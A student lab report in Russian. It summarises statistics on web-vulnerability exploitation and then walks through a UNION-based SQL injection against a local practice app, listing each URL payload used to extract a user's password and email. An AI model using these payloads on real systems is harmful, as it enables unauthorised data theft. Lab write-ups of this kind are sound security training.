# Отчет по лабораторной работе 1

## Часть I. Статистика по атакам через веб-уязвимости

### Использованные источники

- Verizon. 2025 Data Breach Investigations Report Executive Summary. Опубликован в 2025 году. https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf
- IBM. X-Force Threat Intelligence Index 2025. Опубликован в 2025 году. https://www.ibm.com/think/x-force/x-force-threat-intelligence-index
- Positive Technologies. Киберугрозы финансовой отрасли: 2023-2024. Опубликован 16 октября 2024 года. https://ptsecurity.com/ru-ru/research/analytics/financial-industry-security-h2-2023-h1-2024/
- OWASP Top 10:2025. Опубликован в 2025 году. https://owasp.org/Top10/2025/
- OWASP A01:2025 Broken Access Control. https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/
- OWASP A02:2025 Security Misconfiguration. https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/
- OWASP A04:2025 Cryptographic Failures. https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/
- OWASP A05:2025 Injection. https://owasp.org/Top10/2025/A05_2025-Injection/
- OWASP A07:2025 Authentication Failures. https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/

### Доля успешных атак, связанных с эксплуатацией уязвимостей

- По данным Verizon DBIR 2025, эксплуатация уязвимостей составила 20% initial access vector в выборке non-error и non-misuse breaches. Это глобальная межотраслевая статистика.
- По данным IBM X-Force Threat Intelligence Index 2025, в критических отраслях более 25% инцидентов были связаны с эксплуатацией уязвимостей.
- По данным Positive Technologies для финансовой отрасли, в первой половине 2024 года эксплуатация уязвимостей использовалась в 25% успешных атак, а во второй половине 2023 года этот показатель доходил до 45%.

Промежуточный вывод: если брать общий глобальный срез, доля атак через эксплуатацию уязвимостей находится примерно в диапазоне 20-25%. Если смотреть на более узкий и уязвимый сегмент, например финансовую отрасль, то показатель может быть заметно выше и доходить до 45%.

### Распределение по конкретным уязвимостям

В качестве распределения по типам веб-уязвимостей удобно использовать OWASP Top 10:2025 с метрикой average incidence rate:

- Cryptographic Failures: 3.80%
- Broken Access Control: 3.74%
- Injection: 3.08%
- Security Misconfiguration: 3.00%
- Authentication Failures: 2.92%

Дополнительно по категории Injection OWASP указывает, что:

- Cross-Site Scripting связано более чем с 30 тысячами CVE
- SQL Injection связано более чем с 14 тысячами CVE

Вывод по части I: веб-атаки и эксплуатация уязвимостей остаются одним из ключевых путей проникновения в компании. При этом SQL-инъекция уже не является самой массовой категорией уязвимостей, но по-прежнему относится к высокоопасным, потому что напрямую ведет к чтению конфиденциальных данных из базы.

## Часть II. Практика SQL Injection

### Подготовка стенда

- В папку проекта был добавлен `docker-compose.yml`.
- Для запуска на Apple Silicon в compose-файл добавлен `platform: linux/amd64`, потому что образ `mysql:5.7` не имеет подходящего `arm64`-манифеста.
- База была инициализирована штатной страницей установки.

Примечание: из-за ограничений песочницы запросы фактически выполнялись изнутри web-контейнера по адресу `127.0.0.1`, но это полностью эквивалентно внешним URL с хостом `localhost:8080`, которые и приведены ниже.

### Цель

- Узнать пароль пользователя с ником `Volk2`
- Узнать почту пользователя с ником `Vinni-pukh`

### Логика эксплуатации

Сначала я проверил обычный ответ страницы, затем подтвердил наличие SQL-инъекции одиночной кавычкой. После этого подобрал число столбцов в `UNION SELECT`. Когда стало ясно, что столбцов три, а выводится контролируемое значение из второго столбца, стало возможно подставлять туда пароль и почту.

### Все отправленные URL

1. Подготовка базы:

```text
http://localhost:8080/sql-connections/setup-db.php
```

Результат: база успешно пересоздана и заполнена.

2. Базовый запрос:

```text
http://localhost:8080/task/index.php?id=1
```

Результат: страница возвращает `Ваш id:1` и `Ваш логин:admin`.

3. Проверка на SQL injection:

```text
http://localhost:8080/task/index.php?id=1%27
```

Результат: сервер вернул SQL syntax error, значит параметр `id` вставляется в SQL без безопасной параметризации.

4. Неудачная попытка с неверным числом столбцов:

```text
http://localhost:8080/task/index.php?id=-1%27%20UNION%20SELECT%201,2--%20-
```

Результат: `The used SELECT statements have a different number of columns`.

5. Проверка корректного числа столбцов:

```text
http://localhost:8080/task/index.php?id=-1%27%20UNION%20SELECT%201,2,3--%20-
```

Результат: страница вернула `Ваш id:1` и `Ваш логин:2`, значит `UNION SELECT` с тремя столбцами работает, а контролируемый вывод попадает во второй столбец.

6. Получение пароля пользователя `Volk2`:

```text
http://localhost:8080/task/index.php?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=%27Volk2%27--%20-
```

Результат: страница вернула `Ваш логин:Wa spoiuuuuu`.

7. Получение идентификатора пользователя `Vinni-pukh`:

```text
http://localhost:8080/task/index.php?id=-1%27%20UNION%20SELECT%201,id,3%20FROM%20users%20WHERE%20username=%27Vinni-pukh%27--%20-
```

Результат: страница вернула `Ваш логин:4`.

8. Получение почты пользователя `Vinni-pukh` по найденному `id`:

```text
http://localhost:8080/task/index.php?id=-1%27%20UNION%20SELECT%201,email_id,3%20FROM%20emails%20WHERE%20id=4--%20-
```

Результат: страница вернула `Ваш логин:honey_lover@otus-lab.com`.

### Итоговые ответы

- Пароль пользователя `Volk2`: `Wa spoiuuuuu`
- Почта пользователя `Vinni-pukh`: `honey_lover@otus-lab.com`

### Краткий вывод по практике

Уязвимость возникла из-за конкатенации пользовательского ввода прямо в SQL-запрос. Приложение дополнительно упростило атаку тем, что возвращало диагностические сообщения MySQL и позволяло подобрать количество столбцов через `UNION SELECT`. После этого конфиденциальные данные удалось извлечь без аутентификации.
